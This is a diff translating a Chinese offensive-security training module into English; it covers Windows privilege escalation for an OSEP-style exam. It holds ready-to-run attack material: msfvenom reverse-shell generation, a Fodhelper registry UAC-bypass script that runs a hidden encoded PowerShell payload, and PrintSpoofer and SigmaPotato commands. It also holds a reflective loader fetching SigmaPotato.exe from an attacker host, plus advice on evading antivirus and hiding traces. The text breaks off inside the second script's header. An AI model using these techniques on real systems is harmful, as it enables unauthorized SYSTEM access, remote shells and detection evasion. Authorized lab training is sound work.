@@ -2,95 +2,91 @@
 For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
 :::
 
-# Module 06 — Windows privilege escalation
+# 06 · UAC Bypass & Windows local privilege escalation (scenarios 25–27)
 
-whoami /all first. Filtered admin token → UAC. SeImpersonate → potato family. Writable service → hijack.
+> Technique alignment (keywords: `UAC Bypass` `PrintSpoofer` `SigmaPotato` `FullPowers` `AlwaysInstallElevated` `Service Binary Hijacking`).
+> Related modules: this module covers **local privilege escalation after the first foothold**. Lateral movement: [15-winrm-lateral](/modules/15-winrm-lateral). Credential collection: [07-credentials-lsass](/modules/07-credentials-lsass).
+> Shared placeholders: `LHOST` `LPORT` `TARGET` `DOMAIN` `USER` `PASS` `NTHASH` `PAYLOAD` `URL`.
 
-Switch to **中文** in the header for the original full narrative. Lab listings on this page are complete.
+Recommended triage order for the three priv-esc shapes in this module:
 
-> 技术路线对齐 （关键词：`UAC Bypass` `PrintSpoofer` `SigmaPotato` `FullPowers` `AlwaysInstallElevated` `Service Binary Hijacking`）。
-> 相关模块：本模块只讲「拿到第一段立足点之后的本地提权」。横向移动见 [15-winrm-lateral](/modules/15-winrm-lateral)，凭据抓取见 [07-credentials-lsass](/modules/07-credentials-lsass)。
-> 统一占位符：`LHOST` `LPORT` `TARGET` `DOMAIN` `USER` `PASS` `NTHASH` `PAYLOAD` `URL`。
+1. **Already an admin but on a filtered token** (UAC medium integrity) → scenario 25 (Fodhelper-style UAC bypass).
+2. **Service account / low priv but holds SeImpersonatePrivilege** → scenario 26 (PrintSpoofer / SigmaPotato family).
+3. **Write access to a local service / can start-stop it** → scenario 27 (service binary hijack).
 
-三种提权形态在本模块的适用顺序（考试建议的排查顺序）：
-
-1. **永远是管理员但在受限令牌下**（UAC 中等完整性）→ 场景 25（Fodhelper 等 UAC bypass）。
-2. **服务账户 / 低权限但持有 SeImpersonatePrivilege** → 场景 26（PrintSpoofer / SigmaPotato 系）。
-3. **对本地服务有写权限 / 可停启服务** → 场景 27（服务二进制劫持）。
-
-先跑一次快速身份判定再决定走哪条：
+Run a quick identity check before picking a path:
 
 ```powershell
-whoami /all                     # 看 Mandatory Label（完整性）、Privileges（SeImpersonate 等）
-net localgroup administrators    # 是否已是本地管理员组成员
-sc qc <ServiceName>              # 之后场景 27 用
+whoami /all                     # Mandatory Label (integrity), Privileges (SeImpersonate, etc.)
+net localgroup administrators    # already a local Administrators member?
+sc qc <ServiceName>              # used later in scenario 27
 ```
 
 ---
 
-## Scenario 25 · 未提升令牌 → Fodhelper 注册表 UAC Bypass
+## Scenario 25 · Unelevated token → Fodhelper registry UAC Bypass
 
-### Scenario回顾
-已通过钓鱼/Webshell/凭据获得一枚**本地管理员组成员但未提升**的令牌（`whoami /groups` 里 `Mandatory Label\Medium Mandatory Level`，但用户属于 `BUILTIN\Administrators`）。目标是执行高权限（高完整性）命令，绕过 UAC。Windows 10/11 常见主机默认 `ConsentPromptBehaviorAdmin=5`（提示输入凭据）——能自动 UAC bypass 的前提是**用户已是管理员组成员**；若默认是 `EnableLUA=0` 或提示行为 = 每次都问（值 2），则不适用。
+### Situation
+Via phishing/webshell/creds you have a token that is a **local Administrators member but unelevated** (`whoami /groups` shows `Mandatory Label\Medium Mandatory Level`, yet the user is in `BUILTIN\Administrators`). Goal: run a high-integrity command and bypass UAC. On common Win10/11 defaults `ConsentPromptBehaviorAdmin=5` (prompt for credentials) — automatic UAC bypass still requires the **user already be an Administrators member**; if `EnableLUA=0` or prompt behavior = always ask (value 2), this path may not apply.
 
-### 前提与假设
-- 当前用户 `USER` 属于本地 `Administrators` 组，且 UAC 开启（`EnableLUA=1`，默认）。
-- 有可写位置放 payload（通常是用户目录，无需高权限）。
-- 目标无完整杀软/EDR 阻止注册表写入或 spawn 行为（如存在，见失败分支）。
-- 考试中常见变体：Fodhelper、ComputerDefaults、wsreset、eventvwr（新版已修复/受路径影响）。
+### Assumptions
+- Current user `USER` is in the local `Administrators` group, and UAC is on (`EnableLUA=1`, default).
+- You have a writable place for the payload (usually the user profile; high rights not required).
+- Target has no full AV/EDR blocking registry writes or spawn behavior (if it does, see failure branches).
+- Common exam variants: Fodhelper, ComputerDefaults, wsreset, eventvwr (newer builds may be fixed / path-sensitive).
 
-### 准备（attacker box侧）
+### Prepare (attacker)
 ```bash
-# 1. 生成反向 shell 或 beacon
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT -f exe -o svc.exe   # 服务二进制示例
-# 或准备无文件第二阶段：m06-fodhelper-uac.ps1 内嵌 PAYLOAD 变量
+# 1. Generate reverse shell or beacon
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT -f exe -o svc.exe   # service-binary example
+# or prepare a fileless second stage: m06-fodhelper-uac.ps1 embeds a PAYLOAD variable
 
-# 2. attacker box监听
-nc -lvnp LPORT            # 或 msfconsole 的 handler / CS listener
+# 2. Attacker listener
+nc -lvnp LPORT            # or msfconsole handler / CS listener
 ```
 
-### 执行步骤
-原理：`fodhelper.exe`（Windows 功能助手，位于 `C:\Windows\System32`，默认自动提升 manifest）启动时会查询 `HKCU\Software\Classes\ms-settings\Shell\Open\command`，若存在则**以高完整性**执行该 command。因为键在 `HKCU`，未提升进程即可写。
+### Procedure
+Principle: `fodhelper.exe` (Windows Features helper under `C:\Windows\System32`, auto-elevate manifest by default) queries `HKCU\Software\Classes\ms-settings\Shell\Open\command` at start; if present it runs that command **at high integrity**. Because the key is under `HKCU`, an unelevated process can write it.
 
 ```powershell
-# 在目标上（中完整性 shell / Webshell 执行）
-# 1) 写一个高权限要跑的命令（反向 shell 或加管理员）：
-#    DelegateExecute 必须存在（空字符串），默认值放要执行的命令
+# On target (medium-integrity shell / webshell)
+# 1) Write the high-rights command to run (reverse shell or add admin):
+#    DelegateExecute must exist (empty string); default value holds the command
 reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
 reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "cmd.exe /c powershell -nop -w hidden -enc <BASE64>" /f
-# 注意：命令载体与触发宿主多套变体见 m06-fodhelper-uac.ps1；不要先 /ve 后 /v 顺序颠倒
+# Note: command carriers and trigger hosts — multiple variants in m06-fodhelper-uac.ps1; do not reverse /ve then /v order
 
-# 2) 触发（会弹一次 UAC 画面临时闪烁后消失或直接静默提升，取决于设置）：
+# 2) Trigger (may briefly flash a UAC UI then vanish, or silent elevate, depending on settings):
 fodhelper.exe
-# 备选宿主：computerdefaults.exe  /  wsreset.exe（win10 1803-1903） /  slui.exe
+# Alternate hosts: computerdefaults.exe  /  wsreset.exe (Win10 1803-1903)  /  slui.exe
 
-# 3) 清理注册表键（重要！）：
+# 3) Clean the registry key (important!):
 reg delete "HKCU\Software\Classes\ms-settings" /f
 ```
 
-集成脚本：`m06-fodhelper-uac.ps1`（自动写入键、触发、可选延时清理）。
+Integrated script: `m06-fodhelper-uac.ps1` (writes keys, triggers, optional delayed cleanup).
 
-### 用到的脚本
+### Lab files
 - `m06-fodhelper-uac.ps1`
 
 ### Verify
-- `whoami /groups` 在反弹 shell 中显示 `High Mandatory Level`；
-- `net session` 不报“拒绝访问”，或可读取管理员专属路径。
+- `whoami /groups` in the reverse shell shows `High Mandatory Level`;
+- `net session` no longer reports “Access is denied”, or you can read admin-only paths.
 
-### 失败分支与备选
-1. **命令没执行但也没报错**：先手工 `cmd /c fodhelper.exe` 观察；确认 `DelegateExecute` 空字符串键是否写对、默认值名称（不是 `(Default)` 引号问题）写对；换 `computerdefaults.exe`。
-2. **主机是 Win10 老版本 / UAC 关闭 / 用户不是管理员**：`EnableLUA=0` 时无需 bypass（直接高权限）；用户非管理员组成员时 Fodhelper 无效 → 改走服务提权/内核（本模块场景 26/27，或 MS16-032 等历史漏洞——考试一般不考内核）。
-3. **杀软拦截 `reg add` 或 `spawn`**：把注册表写入与触发拆到两阶段（写入用 shell，触发用计划任务或 `schtasks /run`）；payload 用无文件 PowerShell 编码 + AMSI 处理（见 M05）；最后清理键，避免留下明显 IOC。
-4. **Fodhelper 被策略禁用/路径重定向**：尝试 `computerdefaults.exe`、`wsreset.exe`、`slui.exe` 等同族；或切 `AlwaysInstallElevated`（见下方提示条）。
-5. 反弹 shell 不稳定：先不加持久化，直接跑既定命令（谁启动、以什么权限启动，见 m06-fodhelper-uac.ps1 说明）。
+### If it fails
+1. **Command never ran and no error**: manually `cmd /c fodhelper.exe` and watch; confirm the empty `DelegateExecute` string and the default value name (not a `(Default)` quoting issue); try `computerdefaults.exe`.
+2. **Old Win10 / UAC off / user not admin**: with `EnableLUA=0` you do not need a bypass (already high rights); if the user is not an Administrators member, Fodhelper is useless → switch to service priv-esc / kernel (scenarios 26/27 here, or historical bugs like MS16-032 — exam usually does not test kernel).
+3. **AV blocks `reg add` or spawn**: split registry write and trigger into two stages (write via shell, trigger via scheduled task or `schtasks /run`); payload as fileless encoded PowerShell + AMSI handling (see M05); clean the key afterward to avoid an obvious IOC.
+4. **Fodhelper disabled / path redirected by policy**: try `computerdefaults.exe`, `wsreset.exe`, `slui.exe` same family; or switch to `AlwaysInstallElevated` (see tip below).
+5. Unstable reverse shell: skip persistence first; run a fixed command (who starts it, at what rights — see `m06-fodhelper-uac.ps1` notes).
 
-> 提示：AlwaysInstallElevated（`HKLM\...\Windows Installer` 与 `HKCU\...\Windows Installer` 同时为 1）时，可 `msiexec /quiet /qn /i payload.msi` 直接提权——这是 cheat sheet 单独列的条目，写注册表探测两条路径后即可用（脚本中给探测命令）。
+> Tip: AlwaysInstallElevated (`HKLM\...\Windows Installer` and `HKCU\...\Windows Installer` both 1) lets you `msiexec /quiet /qn /i payload.msi` for direct elevation — a separate cheat-sheet entry; probe both registry paths first (the script includes probe commands).
 
-### 考试注意 OPSEC
-- **用后必清注册表键**（`reg delete`），否则该用户后续任何设置类操作都会再触发命令，留下持久化痕迹。
-- Fodhelper 触发时可能出现 UAC 弹窗闪烁——在交互会话中会被用户看到；若环境允许，优先非交互载荷 + 短命令。
-- 反弹连接统一走 `LHOST/LPORT`，别在命令里硬编码attacker box内网 IP（会被蓝队/EDR 关联）。
-- 该场景拿到的还是**同一用户**的高完整性令牌，不是 SYSTEM——后续横向/提权别混淆。
+### Exam notes / OPSEC
+- **Always clean the registry key after use** (`reg delete`); otherwise later settings-class actions for that user re-trigger the command and leave persistence.
+- Fodhelper may flash a UAC dialog — visible in an interactive session; if the environment allows, prefer non-interactive payloads + short commands.
+- Callbacks always use `LHOST/LPORT`; do not hardcode attacker LAN IPs in commands (blue team/EDR correlation).
+- What you get is still a **same-user** high-integrity token, not SYSTEM — do not confuse later lateral/priv-esc steps.
 
 ---
 
@@ -98,15 +94,15 @@ reg delete "HKCU\Software\Classes\ms-settings" /f
 
 ````powershell
 <#
-用途：当前用户已是本地管理员组成员但会话未提升（中完整性）时，用 Fodhelper/ComputerDefaults 等自动提升宿主触发高权限命令，并自动清理注册表键
-场景：docs/06-uac-windows-privesc.md 场景 25（未提升管理员令牌 → UAC Bypass）
-依赖：PowerShell 3.0+（2.0 也能跑主体逻辑）；要求 UAC 开启(EnableLUA=1)且用户属本地 Administrators；被 IEX 或 -f 执行均可
-使用：powershell -nop -w hidden -ep bypass -f m06-fodhelper-uac.ps1 -Command "cmd.exe /c whoami > C:\Windows\Temp\ok.txt"
-      # 典型：弹回高完整性 PowerShell，再自行 IEX 反弹：
-      powershell -ep bypass -f m06-fodhelper-uac.ps1 -Command "powershell -nop -w hidden -enc <BASE64>"
-      # 备选宿主：-HostBin ComputerDefaults | Wsreset | Fodhelper(默认)；-DelaySeconds 控制清理延时；-Keep 保留注册表键
-占位符：BASE64=第二阶段命令编码（攻击机 iconv -t UTF-16LE|base64）；LHOST/LPORT 已编码进 BASE64
-测试状态：未在 Windows 实测（本机为 macOS）；语法经人工检查。先在隔离 VM 验证一次触发与清理
+Purpose: When the current user is a local Administrators member but the session is unelevated (medium integrity), use Fodhelper/ComputerDefaults-style auto-elevate hosts to run a high-rights command, then auto-clean the registry key
+Scenario: docs/06-uac-windows-privesc.md scenario 25 (unelevated admin token → UAC Bypass)
+Depends: PowerShell 3.0+ (2.0 can run the core logic); requires UAC on (EnableLUA=1) and user in local Administrators; works via IEX or -f
+Usage: powershell -nop -w hidden -ep bypass -f m06-fodhelper-uac.ps1 -Command "cmd.exe /c whoami > C:\Windows\Temp\ok.txt"
+       # Typical: bounce a high-integrity PowerShell, then IEX a reverse shell yourself:
+       powershell -ep bypass -f m06-fodhelper-uac.ps1 -Command "powershell -nop -w hidden -enc <BASE64>"
+       # Alternate hosts: -HostBin ComputerDefaults | Wsreset | Fodhelper (default); -DelaySeconds controls cleanup delay; -Keep retains the registry key
+Placeholders: BASE64=encoded second-stage command (attacker: iconv -t UTF-16LE|base64); LHOST/LPORT already encoded into BASE64
+Test status: Not run on Windows (host is macOS); syntax checked by hand. Validate trigger + cleanup once in an isolated VM first
 #>
 [CmdletBinding()]
 param(
@@ -115,143 +111,143 @@ param(
     [string]$HostBin = "Fodhelper",
     [int]$DelaySeconds = 5,
     [switch]$Keep,
-    [switch]$DryRun          # 只写键 + 打印将触发的宿主，不真正启动（调试用）
+    [switch]$DryRun          # write key + print host that would trigger; do not actually start (debug)
 )
 
 $ErrorActionPreference = "Stop"
 $KeyPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
 $BinMap = @{
-    Fodhelper        = "C:\Windows\System32\fodhelper.exe"        # Win10/11、Server 2016+，最通用
-    ComputerDefaults = "C:\Windows\System32\ComputerDefaults.exe" # 同 ms-settings 协议，备用
-    Wsreset          = "C:\Windows\System32\wsreset.exe"          # Win10 1803~1903 有效，新版已修
+    Fodhelper        = "C:\Windows\System32\fodhelper.exe"        # Win10/11, Server 2016+ — most general
+    ComputerDefaults = "C:\Windows\System32\ComputerDefaults.exe" # same ms-settings protocol, backup
+    Wsreset          = "C:\Windows\System32\wsreset.exe"          # Win10 1803~1903; fixed on newer builds
 }
 $HostExe = $BinMap[$HostBin]
 
 function Test-AdminMember {
-    # 用户是否在本地 Administrators 组（UAC bypass 硬前提）
+    # Whether the user is in local Administrators (hard prerequisite for UAC bypass)
     $id = [Security.Principal.WindowsIdentity]::GetCurrent()
     $p  = New-Object Security.Principal.WindowsPrincipal($id)
     return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
 function Test-Elevated {
-    # 会话是否已高完整性（若是，无需 bypass）
+    # Whether the session is already high integrity (if so, no bypass needed)
     try { $t = (whoami /groups | Select-String "S-1-16-12288") -ne $null; return $t }
     catch { return $false }
 }
 
 function Write-Log($m) { Write-Output ("[{0}] {1}" -f (Get-Date -Format "HH:mm:ss"), $m) }
 
-# ---------- 前置检查 ----------
-if (-not (Test-Elevated)) { Write-Log "当前会话非高完整性，继续" } else { Write-Log "已是高完整性，无需 bypass（直接跑命令即可）"; exit 0 }
+# ---------- Pre-checks ----------
+if (-not (Test-Elevated)) { Write-Log "session is not high integrity — continuing" } else { Write-Log "already high integrity; no bypass needed (run the command directly)"; exit 0 }
 if (-not (Test-AdminMember)) {
-    Write-Log "[-] 当前用户不在本地 Administrators 组，Fodhelper 路不可用（UAC bypass 需要管理员组成员）"
-    Write-Log "[-] 改走：AlwaysInstallElevated 探测 / 服务提权（见 docs/06 场景 26/27）"
+    Write-Log "[-] current user is not in local Administrators — Fodhelper path unavailable (UAC bypass needs Administrators membership)"
+    Write-Log "[-] switch to: AlwaysInstallElevated probe / service priv-esc (see docs/06 scenarios 26/27)"
     exit 1
 }
-if (-not (Test-Path $HostExe)) { Write-Log "[-] 宿主 $HostExe 不存在，换 -HostBin 或新系统重测"; exit 1 }
+if (-not (Test-Path $HostExe)) { Write-Log "[-] host $HostExe missing — change -HostBin or retest on a newer system"; exit 1 }
 
-# ---------- 写入注册表 ----------
-Write-Log "[+] 写入 $KeyPath （DelegateExecute 为空 + 默认值=命令）"
+# ---------- Write registry ----------
+Write-Log "[+] writing $KeyPath (DelegateExecute empty + default value = command)"
 try {
     New-Item -Path $KeyPath -Force | Out-Null
     New-ItemProperty -Path $KeyPath -Name "DelegateExecute" -PropertyType String -Value "" -Force | Out-Null
     Set-ItemProperty -Path $KeyPath -Name "(default)" -Value $Command -Force
-    Write-Log "[+] 命令已写入：(default) = $Command"
+    Write-Log "[+] command written: (default) = $Command"
 } catch {
-    Write-Log "[-] 注册表写入失败：$($_.Exception.Message)（检查是否被策略/杀软拦截）"
+    Write-Log "[-] registry write failed: $($_.Exception.Message) (check policy/AV block)"
     exit 1
 }
 
 if ($DryRun) {
-    Write-Log "[DryRun] 将触发：$HostExe（未实际启动）"
+    Write-Log "[DryRun] would trigger: $HostExe (not started)"
     if (-not $Keep) { Remove-Item -Path $KeyPath -Recurse -Force -ErrorAction SilentlyContinue }
     exit 0
 }
 
-# ---------- 触发 ----------
-Write-Log "[+] 触发 $HostExe ...（可能短暂出现 UAC 闪烁或黑窗）"
+# ---------- Trigger ----------
+Write-Log "[+] triggering $HostExe ... (may briefly flash UAC or a black window)"
 try { Start-Process -FilePath $HostExe -WindowStyle Hidden | Out-Null } catch { Start-Process -FilePath $HostExe | Out-Null }
 
-# ---------- 等待并清理 ----------
-Write-Log "[+] 等待 $DelaySeconds 秒后清理注册表键（防持久化残留）"
+# ---------- Wait and clean ----------
+Write-Log "[+] waiting $DelaySeconds s then cleaning registry key (avoid persistence leftovers)"
 Start-Sleep -Seconds $DelaySeconds
 if ($Keep) {
-    Write-Log "[!] -Keep 已设：保留 $KeyPath（考试交卷前请手动清理）"
+    Write-Log "[!] -Keep set: retaining $KeyPath (clean manually before exam hand-in)"
 } else {
     Remove-Item -Path $KeyPath -Recurse -Force -ErrorAction SilentlyContinue
-    if (Test-Path $KeyPath) { Write-Log "[-] 清理失败，手动执行：reg delete HKCU\Software\Classes\ms-settings /f" }
-    else { Write-Log "[+] 注册表键已清理" }
+    if (Test-Path $KeyPath) { Write-Log "[-] cleanup failed — manually: reg delete HKCU\Software\Classes\ms-settings /f" }
+    else { Write-Log "[+] registry key cleaned" }
 }
 
-# ---------- 验证提示 ----------
-Write-Log "[*] 验证：反弹/子进程里 whoami /groups 应显示 High Mandatory Level (S-1-16-12288)"
-Write-Log "[*] 失败排查：A) DelegateExecute 键是否写入成功  B) 换 -HostBin ComputerDefaults  C) 用户是否确为管理员组成员  D) 命令本身是否被杀软拦（先用 cmd /c whoami > 文件 验证高权限）"
+# ---------- Verify hints ----------
+Write-Log "[*] verify: whoami /groups in reverse/child process should show High Mandatory Level (S-1-16-12288)"
+Write-Log "[*] failure triage: A) DelegateExecute written?  B) try -HostBin ComputerDefaults  C) user really Administrators member?  D) command itself blocked by AV? (first prove high rights with cmd /c whoami > file)"
 ````
 
-## Scenario 26 · SeImpersonate 令牌 → PrintSpoofer / SigmaPotato
+## Scenario 26 · SeImpersonate token → PrintSpoofer / SigmaPotato
 
-### Scenario回顾
-已获得一个**服务账户或本地服务上下文中可执行命令**的立足点（如 Webshell 以 IIS AppPool 身份、SQL Server 的 `xp_cmdshell`、Windows 服务本身），检查 `whoami /priv` 发现 `SeImpersonatePrivilege`（或 `SeAssignPrimaryTokenPrivilege`）。目标是拿到 `NT AUTHORITY\SYSTEM`。
+### Situation
+You have a foothold where you can run commands as a **service account or local service context** (e.g. webshell as IIS AppPool, SQL Server `xp_cmdshell`, a Windows service itself). `whoami /priv` shows `SeImpersonatePrivilege` (or `SeAssignPrimaryTokenPrivilege`). Goal: get `NT AUTHORITY\SYSTEM`.
 
-### 前提与假设
-- 进程令牌带 `SeImpersonatePrivilege`（默认所有服务账户、IIS AppPool、MSSQL 服务账户都有）。
-- attacker box能访问目标上**可写目录**（放工具/二进制），或目标能出网下载。
-- 服务以 `LocalSystem`/`NetworkService`/`LocalService` 运行时，另一侧要能连回attacker box监听（PrintSpoofer 方式需要回连）或本机自回环（Potato 方式多不需要出网）。
+### Assumptions
+- Process token has `SeImpersonatePrivilege` (default for all service accounts, IIS AppPool, MSSQL service accounts).
+- Attacker can reach a **writable directory** on the target (drop tools/binaries), or the target can egress to download.
+- When the service runs as `LocalSystem`/`NetworkService`/`LocalService`, the other side must either callback to the attacker listener (PrintSpoofer style) or use local loopback (many Potato variants need no egress).
 
-### 准备（attacker box侧）
+### Prepare (attacker)
 ```bash
-# PrintSpoofer（Windows 10/11 + Server 2016+，最稳）
-#  - 本地 https://github.com/itm4n/PrintSpoofer （发布二进制）
-# SigmaPotato（Potato 系现代版，Variant 1 = 本地，Variant 2/3 用 RPC 到attacker box）
-#  - 本地 https://github.com/Kevin-Robertson/SigmaPotato
-# 自编译注意：C++ 项目在 VS 里 target x64，静态/动态选型按目标。
+# PrintSpoofer (Windows 10/11 + Server 2016+ — most stable)
+#  - local https://github.com/itm4n/PrintSpoofer (release binaries)
+# SigmaPotato (modern Potato family; Variant 1 = local, Variant 2/3 use RPC to attacker)
+#  - local https://github.com/Kevin-Robertson/SigmaPotato
+# Self-build notes: C++ project in VS, target x64; static/dynamic per target.
 
-# attacker box监听（PrintSpoofer 需要attacker box有监听；SigmaPotato 本地变体不需要）：
+# Attacker listener (PrintSpoofer needs one; SigmaPotato local variants do not):
 nc -lvnp LPORT
 ```
 
-### 执行步骤
+### Procedure
 ```powershell
-# 0) 确认特权确实开启（很多工具失败是因为特权被禁用 → 先 FullPowers/手动启用）：
+# 0) Confirm the privilege is actually enabled (many tool failures are Disabled privilege → FullPowers / enable first):
 whoami /priv
 
-# 1) 上传/落地工具（IIS AppPool 有写权限的目录、%TEMP% 均可）
-# 2) PrintSpoofer —— 本机提权，反弹到attacker box：
-PrintSpoofer64.exe -i -c "cmd.exe /c powershell -nop -w hidden -enc <BASE64>"   # -i 交互式（本机弹窗）
-PrintSpoofer64.exe -c "cmd.exe /c powershell -nop -w hidden -enc <BASE64>"      # 或直接反弹
+# 1) Upload/land the tool (IIS AppPool-writable dirs, %TEMP%, etc.)
+# 2) PrintSpoofer — local elevate, reverse to attacker:
+PrintSpoofer64.exe -i -c "cmd.exe /c powershell -nop -w hidden -enc <BASE64>"   # -i interactive (local popup)
+PrintSpoofer64.exe -c "cmd.exe /c powershell -nop -w hidden -enc <BASE64>"      # or reverse directly
 
-# 3) SigmaPotato（如果网络限制/不需要出网）：
-#    本地变体直接跑，不加参数 → 输出 SYSTEM shell 的命令模板
-SigmaPotato.exe -cmd "cmd /c whoami"                                            # 测试
-SigmaPotato.exe -cmd "powershell -nop -w hidden -enc <BASE64>"                  # 执行
+# 3) SigmaPotato (network constrained / no egress needed):
+#    local variant runs with no extra args → prints SYSTEM shell command templates
+SigmaPotato.exe -cmd "cmd /c whoami"                                            # test
+SigmaPotato.exe -cmd "powershell -nop -w hidden -enc <BASE64>"                  # execute
 
-# 4) 老版本系统（Server 2008/2012、Win7/8）：
-#    RoguePotato / PrintSpoofer 不适用时用 JuicyPotato（2012/2016 老系统）或 Potato 系列
+# 4) Older systems (Server 2008/2012, Win7/8):
+#    When RoguePotato / PrintSpoofer do not apply, use JuicyPotato (2012/2016 older) or Potato family
 ```
 
-### 用到的脚本
-- `m06-sigmapotato-reflect.ps1`（离线自包含版本——不落地 EXE，用反射方式执行 SigmaPotato 的核心逻辑；同时是“自动工具失败时的手工备选”的载体）
-- 备选工具形态见文档：PrintSpoofer 二进制、JuicyPotato、RoguePotato、SpoolSample（打印假脱机诱导认证，见下）。
+### Lab files
+- `m06-sigmapotato-reflect.ps1` (offline self-contained — no landed EXE; reflectively runs SigmaPotato core logic; also the carrier for “manual fallback when auto tools fail”)
+- Alternate tool shapes in the docs: PrintSpoofer binary, JuicyPotato, RoguePotato, SpoolSample (print spooler coerced auth — see below).
 
 ### Verify
-- 执行后 `whoami` 返回 `nt authority\system`；
-- `whoami /groups` 中 `Mandatory Label\High Mandatory Level`（SYSTEM 恒为高）。
+- After exec, `whoami` returns `nt authority\system`;
+- `whoami /groups` shows `Mandatory Label\High Mandatory Level` (SYSTEM is always high).
 
-### 失败分支与备选
-1. **工具一运行就退出/无输出**：先查特权是否被**禁用**（`whoami /priv` 显示 Disabled）——服务账户令牌里的 SeImpersonate 常被禁用，用 FullPowers（GitHub itm4n/FullPowers）恢复或重提 token 后再打；也可检查目标系统版本与工具的兼容性（PrintSpoofer 需要 Server 2016/Win10 1607+；老系统换 JuicyPotato/RoguePotato）。
-2. **工具被杀软查杀/无法落地**：用 `m06-sigmapotato-reflect.ps1` 反射执行，或把工具编码后内存加载（见 M05/M01 思路）；再不行**手工**利用：用 .NET `DuplicateToken` + 创建带 SYSTEM token 的进程（脚本内给出最小实现）。
-3. **PrintSpoofer 需要回连但目标出网受限**：改 SigmaPotato/JuicyPotato 的本地回环变体（无需出网）；或诱导 SYSTEM 通过 SMB/HTTP 回连attacker box（SpoolSample + 中继，见 M16/M11 的 relay 思路）。
-4. **拿到的不是 SYSTEM 而是别的账户**：核对服务运行账户——`NetworkService` 下 PrintSpoofer 通常仍能提到 SYSTEM（打印池是 SYSTEM）；若服务是普通账户无 SeImpersonate，则此路不通，切场景 27。
-5. 工具需要 .NET/运行库：老系统先确认 PowerShell/.NET 版本（SigmaPotato 用 PowerShell 实现则无二进制依赖）。
+### If it fails
+1. **Tool exits immediately / no output**: check whether the privilege is **Disabled** (`whoami /priv` shows Disabled) — SeImpersonate on service-account tokens is often disabled; restore with FullPowers (GitHub itm4n/FullPowers) or re-steal the token, then retry; also check OS version vs tool (PrintSpoofer needs Server 2016/Win10 1607+; older hosts → JuicyPotato/RoguePotato).
+2. **AV kills the tool / cannot land**: use `m06-sigmapotato-reflect.ps1` reflective exec, or encode then memory-load (M05/M01 ideas); last resort **manual**: .NET `DuplicateToken` + create a process with the SYSTEM token (script includes a minimal approach).
+3. **PrintSpoofer needs a callback but target egress is constrained**: switch to SigmaPotato/JuicyPotato local-loopback variants (no egress); or coerce SYSTEM to callback to the attacker over SMB/HTTP (SpoolSample + relay — see M16/M11 relay ideas).
+4. **You got some other account, not SYSTEM**: check the service run-as account — under `NetworkService`, PrintSpoofer usually still reaches SYSTEM (print spooler is SYSTEM); if the service is a normal account without SeImpersonate, this path is dead → scenario 27.
+5. Tool needs .NET/runtime: on older hosts confirm PowerShell/.NET version first (PowerShell-implemented SigmaPotato has no binary dependency).
 
-> SpoolSample（打印假脱机）在此场景的用法：它是**诱导认证**而非直接提权——让 `potato`/`printbug` 触发 SYSTEM 对被控机的认证，配合中继或 RPC 利用（典型是 Printerbug → Relay 到 LDAP/ADCS，见 [12-ad-attacks](/modules/12-ad-attacks) ESC8）。如果本机土豆路线全失败，这是考题的“备选路径”。
+> SpoolSample (print spooler) in this scenario: it is **auth coercion**, not direct priv-esc — make `potato`/`printbug` trigger SYSTEM auth to a host you control, then relay or RPC-abuse (classic Printerbug → Relay to LDAP/ADCS; see [12-ad-attacks](/modules/12-ad-attacks) ESC8). If every local potato path fails, this is the exam “fallback path”.
 
-### 考试注意 OPSEC
-- 上传的 EXE 记得删或放到会被清理的目录；反射脚本不落盘是最干净的形态。
-- PrintSpoofer 反弹走 `LHOST:LPORT`，与阶段一的监听错开端口/协议，避免混淆日志。
-- 只做一次提权确认（whoami），别反复 spawn SYSTEM shell 制造噪音。
-- 交互式 `-i` 弹窗在无桌面会话的服务上下文里无效——一律用 `-c` 带命令。
+### Exam notes / OPSEC
+- Delete uploaded EXEs or park them in dirs that get cleaned; reflective scripts with no disk drop are the cleanest shape.
+- PrintSpoofer reverse uses `LHOST:LPORT` — offset port/protocol from stage-one listeners to avoid log confusion.
+- Confirm priv-esc once (`whoami`); do not spam SYSTEM shells and make noise.
+- Interactive `-i` popups are useless in service contexts with no desktop — always use `-c` with a command.
 
 ---
 
@@ -259,166 +255,166 @@ SigmaPotato.exe -cmd "powershell -nop -w hidden -enc <BASE64>"                  
 
 ````powershell
 <#
-用途：在 SeImpersonate 上下文中用 .NET 反射内存加载 SigmaPotato.exe（不落盘），执行任意 SYSTEM 命令或反向 shell
-场景：docs/06-uac-windows-privesc.md 场景 26（IIS AppPool / SQL 服务账户等 → SYSTEM）；也兼容 PrintSpoofer 拿不到时的手工备选
-依赖：PowerShell 3.0+；目标进程令牌带 SeImpersonatePrivilege（服务账户默认有，但可能被禁用——见 -CheckOnly）；SigmaPotato.exe 由攻击机 HTTP(S) 提供
-使用：powershell -nop -w hidden -ep bypass -f m06-sigmapotato-reflect.ps1 -Url http://LHOST/SigmaPotato.exe -RevShellIP LHOST -RevShellPort LPORT
-      # 只跑命令：-Command "cmd /c whoami"
-      # 本地已下载：-LocalPath C:\Windows\Temp\SigmaPotato.exe -Command "..."
-      # 先体检不动手：-CheckOnly
-占位符：LHOST=攻击机 IP；LPORT=监听端口；URL=http://LHOST/SigmaPotato.exe（我方投递地址）
-测试状态：未在 Windows 实测（本机为 macOS）；语法经人工检查。AMSI/杀软若拦截需先做 AMSI 处理（见 docs/05）
+Purpose: In a SeImpersonate context, .NET-reflectively memory-load SigmaPotato.exe (no disk drop) and run an arbitrary SYSTEM command or reverse shell
+Scenario: docs/06-uac-windows-privesc.md scenario 26 (IIS AppPool / SQL service account etc. → SYSTEM); also a manual fallback when PrintSpoofer is unavailable
+Depends: PowerShell 3.0+; process token has SeImpersonatePrivilege (default for service accounts, but may be Disabled — see -CheckOnly); SigmaPotato.exe served over HTTP(S) from the attacker
+Usage: powershell -nop -w hidden -ep bypass -f m06-sigmapotato-reflect.ps1 -Url http://LHOST/SigmaPotato.exe -RevShellIP LHOST -RevShellPort LPORT
+       # command only: -Command "cmd /c whoami"
+       # already downloaded locally: -LocalPath C:\Windows\Temp\SigmaPotato.exe -Command "..."
+       # health-check only: -CheckOnly
